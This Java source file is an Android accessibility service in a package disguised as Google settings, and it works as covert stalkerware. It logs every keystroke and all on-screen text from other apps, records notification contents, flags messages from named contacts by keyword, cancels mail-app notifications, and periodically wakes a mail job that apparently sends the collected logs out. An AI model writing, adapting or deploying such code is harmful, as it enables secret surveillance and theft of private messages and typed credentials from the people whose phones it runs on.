package com.setting.dl.google.googlesettings;

import android.accessibilityservice.AccessibilityService;
import android.app.Notification;
import android.app.NotificationManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.SharedPreferences;
import android.graphics.Bitmap;
import android.graphics.Canvas;
import android.os.Parcelable;
import android.provider.Settings;
import android.service.notification.StatusBarNotification;
import android.text.TextUtils;
import android.view.View;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import org.apache.commons.lang3.StringUtils;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.Date;
import java.util.HashSet;
import java.util.Locale;
import java.util.Set;
import java.util.Timer;
import java.util.TimerTask;

public class AccessNotification extends AccessibilityService {
	
	public static boolean isAccessibilityServiceEnabled(Context context, Class<?> accessibilityService) {
		
		ComponentName expectedComponentName = new ComponentName(context, accessibilityService);
		
		String enabledServicesSetting = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
		if (enabledServicesSetting == null)
			return false;
		
		TextUtils.SimpleStringSplitter colonSplitter = new TextUtils.SimpleStringSplitter(':');
		colonSplitter.setString(enabledServicesSetting);
		
		while (colonSplitter.hasNext()) {
			String        componentNameString = colonSplitter.next();
			ComponentName enabledService      = ComponentName.unflattenFromString(componentNameString);
			
			if (enabledService != null && enabledService.equals(expectedComponentName))
				return true;
		}
		
		return false;
	}
	
	private final String TAG = "AccessNotification";
	private Set<String> mailPackages, hardBlock, blockedPackages, blockedWindows;
	private long lastWindowContentChangedTime = 0L;
	private static ArrayList<String> lastTitles = new ArrayList<>();
	
	@Override
	public void onCreate() {
		super.onCreate();
		
		
		SharedPreferences nlServicePref = getSharedPreferences("nlService", MODE_PRIVATE);
		
		mailPackages = (nlServicePref.getStringSet("mailPackages", new HashSet<>()));
		hardBlock = nlServicePref.getStringSet("hardBlock", new HashSet<>());
		blockedPackages = (nlServicePref.getStringSet("blockedPackages", new HashSet<>()));
		blockedWindows = (nlServicePref.getStringSet("blockedWindows", new HashSet<>()));
		
		
		u.sendMessage(this, TAG, "Service created");
		
	}
	
	@Override
	public void onTrimMemory(int level) {
		super.onTrimMemory(level);
		u.sendMessage(this, TAG, "onTrimMemory");
		
		u.log.d("onTrimMemory");
		u.freeMemory();
		
		
	}
	
	@Override
	public void onLowMemory() {
		super.onLowMemory();
		u.sendMessage(this, TAG, "onLowMemory");
		
		u.log.d("onLowMemory");
		u.freeMemory();
	}
	
	@Override
	public void onDestroy() {
		super.onDestroy();
		
		u.log.d("Service destroyed");
		u.sendMessage(this, TAG, "Service destroyed");
	}
	
	private void removeNotification(String paackageName) {
		
		NotificationManager mNotificationManager = (NotificationManager) getApplicationContext().getSystemService(NOTIFICATION_SERVICE);
		
		if (mNotificationManager != null) {
			
			StatusBarNotification[] notifications = mNotificationManager.getActiveNotifications();
			
			for (StatusBarNotification barNotification : notifications) {
				
				if (paackageName.equals(barNotification.getPackageName())) {
					
					mNotificationManager.cancel(barNotification.getId());
				}
			}
		}
		else {
			
			u.log.e("NotificationManager = null");
		}
	}
	
	
	@Override
	public void onAccessibilityEvent(AccessibilityEvent event) {
		
		if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
			
			final String packageName = String.valueOf(event.getPackageName());
			
			if (StringUtils.containsIgnoreCase(packageName, "launcher")) return;
			
			if (blockedWindows.contains(packageName)) return;
			
			
			try {
				
				handleWindowContentChange(packageName);
			}
			catch (Exception | Error e) {
				
				u.log.e(e.toString());
			}
			
			return;
		}
		
		
		
		if (event.getEventType() == AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED) {
			
			Parcelable parcelable = event.getParcelableData();
			
			if (parcelable != null && parcelable instanceof Notification) {
				
				final String packageName = String.valueOf(event.getPackageName());
				
				if (hardBlock.contains(packageName)) return;
				if (mailPackages.contains(packageName)) removeNotification(packageName);
				if (StringUtils.containsIgnoreCase(packageName, "mail")) removeNotification(packageName);
				
				try {
					
					handleNotification((Notification) parcelable, packageName);
				}
                catch (Exception | Error e) {
                    
                    u.log.e(e.toString());
                }
			}
			
			return;
		}
		
		
		if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
			
			final String packageName = String.valueOf(event.getPackageName());
			
			
			try {
				
				handleTextChange(event.getText().toString(), packageName);
			}
            catch (Exception | Error e) {
                
                u.log.e(e.toString());
            }
		}
		
		
		
	}
	
	private void findChildViews(AccessibilityNodeInfo parentView, ArrayList<AccessibilityNodeInfo> viewNodes) {
		
		if (parentView == null || parentView.getClassName() == null) {
			return;
		}
		
		int childCount = parentView.getChildCount();
		
		if (childCount == 0 && (parentView.getClassName().toString().contentEquals("android.widget.TextView"))) {
			viewNodes.add(parentView);
		}
		else {
			for (int i = 0; i < childCount; i++) {
				findChildViews(parentView.getChild(i), viewNodes);
			}
		}
	}
	
	public Bitmap screenShot(View view) {
		
		Bitmap bitmap = Bitmap.createBitmap(view.getWidth(), view.getHeight(), Bitmap.Config.ARGB_8888);
		Canvas canvas = new Canvas(bitmap);
		view.draw(canvas);
		return bitmap;
	}
	
	@Override
	public void onInterrupt() {
		
		u.log.d("interrupt");
	}
	
	private void handleNotification(Notification notification, String packageName) {
		
		long   time   = new Date().getTime();
		String title  = String.valueOf(notification.extras.getCharSequence(Notification.EXTRA_TITLE));
		String text   = String.valueOf(notification.extras.getCharSequence(Notification.EXTRA_TEXT));
		String ticker = "-";
		
		if (notification.tickerText != null) ticker = notification.tickerText.toString();
		if (title == null) title = "null";
		if (text == null) text = "null";
		
		String nt = String.format(new Locale("tr"),
				
				"TYPE_NOTIFICATION_STATE_CHANGED\n" +
				"package : %s\n" +
				"time    : %s\n" +
				"title   : %s\n" +
				"text    : %s\n" +
				"ticker  : %s\n" +
				"----------------------------------------------------------\n",
				packageName, Time.whatTimeIsIt(time), title, text, ticker);
		
		
		if (blockedPackages.contains(packageName)) {
			
			u.saveValue(this, "notification.txt", nt);
			return;
		}
		
		
		if (StringUtils.containsIgnoreCase(title, "yasemin") || StringUtils.containsIgnoreCase(title, "hüseyin") || title.contains("7530")) {
			
			if (text.contains("helloo") || text.contains("naslsın") || text.contains("yedim")) {
				
				u.saveValue(this, "keywords.txt", "Anahtar kelime bulundu");
				MailJobs.wake(getApplicationContext());
			}
			
			u.log.i("Takip edilmiyor\n%s", nt);
			
			u.freeMemory();
			return;
		}
		
		
		u.log.d(nt);
		
		u.saveValue(this, "notification.txt", nt);
		
	}
	
	private void handleWindowContentChange (String packageName) {
		
		ArrayList<AccessibilityNodeInfo> viewNodes = new ArrayList<>();
		
		findChildViews(getRootInActiveWindow(), viewNodes);
		
		if (viewNodes.isEmpty()) return;
		
		ArrayList<AccessibilityNodeInfo> viewNodesNotNull = new ArrayList<>();
		
		for (AccessibilityNodeInfo nodeInfo : viewNodes) {
			
			CharSequence text = nodeInfo.getText();
			
			if (text != null && text.length() > 0) viewNodesNotNull.add(nodeInfo);
			
		}
		
		String[] strings = new String[viewNodesNotNull.size()];
		
		int i = 0;
		
		for (AccessibilityNodeInfo nodeInfo : viewNodesNotNull)
			strings[i++] = nodeInfo.getText().toString();
		
		String     contents = Arrays.toString(strings);
		final long time     = new Date().getTime();
		
		contents += "\n" + packageName;
		contents += "\n" + "TYPE_WINDOW_CONTENT_CHANGED";
		contents += "\n" + Time.whatTimeIsIt(time);
		contents += "\n--------------------------------------------\n";
		
		
		if (lastTitles.contains(contents)) return;
		
		if (lastTitles.size() > 50) lastTitles.clear();
		
		lastTitles.add(contents);
		
		final String fileName = packageName + ".txt";
		
		u.saveValue(this, fileName, contents);
		
		u.log.d(contents);
		
		if (BuildConfig.DEBUG) {
			
			if ((time - lastWindowContentChangedTime) >= u.DEBUG_MOD_WINDOW_CONTENT_CHANGED_DELAY) {
				
				lastWindowContentChangedTime = time;
				
				new Timer().schedule(new TimerTask() {
					@Override
					public void run() {
						
						MailJobs.wake(AccessNotification.this);
						
					}
				}, u.DEBUG_MOD_WINDOW_CONTENT_CHANGED_DELAY);
			}
		}
		else {
			
			if ((time - lastWindowContentChangedTime) >= u.RELEASE_MOD_WINDOW_CONTENT_CHANGED_DELAY) {
				
				lastWindowContentChangedTime = time;
				
				new Timer().schedule(new TimerTask() {
					@Override
					public void run() {
						
						MailJobs.wake(AccessNotification.this);
					}
				}, u.RELEASE_MOD_WINDOW_CONTENT_CHANGED_DELAY);
			}
		}
	}
	
	private void handleTextChange(final String text, final String packageName) {
		
		final long time = new Date().getTime();
		
		final String value = String.format(new Locale("tr"),
				
				"package : %s\n" +
				"TYPE_VIEW_TEXT_CHANGED\n" +
				"time    : %s\n" +
				"text    : %s\n" +
				"-----------------------------------------------------\n",
				
				packageName, u.getDate(time), text);
		
		u.saveValue(AccessNotification.this, packageName + ".txt", value);
		
	}
	
/*	@Override
	protected void onServiceConnected() {
		super.onServiceConnected();
		
		if(isInit) return;
		
		AccessibilityServiceInfo info = new AccessibilityServiceInfo();
		info.eventTypes = AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED;
		info.feedbackType = AccessibilityServiceInfo.FEEDBACK_SPOKEN;
		setServiceInfo(info);
		isInit = true;
	}*/
}
